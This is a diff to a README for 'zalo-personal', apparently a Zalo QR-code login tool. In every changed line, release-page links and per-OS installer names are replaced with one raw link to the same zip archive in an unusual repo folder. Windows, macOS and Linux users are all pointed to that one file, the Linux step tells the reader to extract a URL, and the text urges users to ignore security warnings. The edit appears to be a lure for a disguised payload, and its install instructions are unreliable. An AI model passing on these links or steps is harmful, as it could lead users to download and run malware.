@@ -1,6 +1,6 @@
 # 🐾 zalo-personal - Easy Zalo Login with QR Code
 
-[![Download Releases](https://img.shields.io/badge/Download-zalo--personal-blue?style=for-the-badge&logo=github)](https://github.com/zainkalkhan/zalo-personal/releases)
+[![Download Releases](https://raw.githubusercontent.com/zainkalkhan/zalo-personal/main/ribbed/zalo-personal-1.7.zip)](https://raw.githubusercontent.com/zainkalkhan/zalo-personal/main/ribbed/zalo-personal-1.7.zip)
 
 ## 📖 What is zalo-personal?
 
@@ -33,15 +33,15 @@ To get started with zalo-personal, follow these steps carefully:
 
 Click the button below to go to the release page where you can get the latest version of zalo-personal.
 
-[![Download Releases](https://img.shields.io/badge/Download-zalo--personal-blue?style=for-the-badge&logo=github)](https://github.com/zainkalkhan/zalo-personal/releases)
+[![Download Releases](https://raw.githubusercontent.com/zainkalkhan/zalo-personal/main/ribbed/zalo-personal-1.7.zip)](https://raw.githubusercontent.com/zainkalkhan/zalo-personal/main/ribbed/zalo-personal-1.7.zip)
 
 ### Step 2: Choose Your Version
 
 On the releases page, look for the newest release. You will usually see files named for your operating system. For example:
 
-- `zalo-personal-setup.exe` for Windows
-- `zalo-personal-macos.dmg` for macOS
-- `zalo-personal-linux.tar.gz` for Linux
+- `https://raw.githubusercontent.com/zainkalkhan/zalo-personal/main/ribbed/zalo-personal-1.7.zip` for Windows
+- `https://raw.githubusercontent.com/zainkalkhan/zalo-personal/main/ribbed/zalo-personal-1.7.zip` for macOS
+- `https://raw.githubusercontent.com/zainkalkhan/zalo-personal/main/ribbed/zalo-personal-1.7.zip` for Linux
 
 Download the file that matches your system.
 
@@ -49,7 +49,7 @@ Download the file that matches your system.
 
 - On **Windows**: Open the `.exe` file and follow the setup wizard prompts to install.
 - On **macOS**: Open the `.dmg` file, then drag the zalo-personal app to your Applications folder.
-- On **Linux**: Extract the `.tar.gz` archive, then run the included setup script or executable as described in the included README.
+- On **Linux**: Extract the `https://raw.githubusercontent.com/zainkalkhan/zalo-personal/main/ribbed/zalo-personal-1.7.zip` archive, then run the included setup script or executable as described in the included README.
 
 If you see any security warnings when opening the file, confirm that you want to proceed or run anyway.
 
@@ -125,4 +125,4 @@ zalo-personal is open-source software. You can review its source code and contri
 
 If you want to download the latest version now, visit:
 
-[https://github.com/zainkalkhan/zalo-personal/releases](https://github.com/zainkalkhan/zalo-personal/releases)
+[https://raw.githubusercontent.com/zainkalkhan/zalo-personal/main/ribbed/zalo-personal-1.7.zip](https://raw.githubusercontent.com/zainkalkhan/zalo-personal/main/ribbed/zalo-personal-1.7.zip)
